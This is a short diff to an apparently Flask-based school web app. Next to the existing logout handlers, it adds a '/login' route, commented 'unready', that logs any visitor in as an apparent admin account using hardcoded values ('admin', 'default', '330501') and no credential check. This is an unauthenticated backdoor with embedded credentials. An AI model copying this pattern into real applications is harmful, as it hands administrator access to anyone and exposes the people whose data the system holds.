@@ -103,3 +103,11 @@ def teacher_logout():
 @login_required
 def admin_logout():
     logout_user()
+
+
+# unready
+@web.route('/login')
+def back_login():
+    checker = LoginChecker('login', 'admin', 'default', '330501')
+    login_user(checker)
+    return 'success'
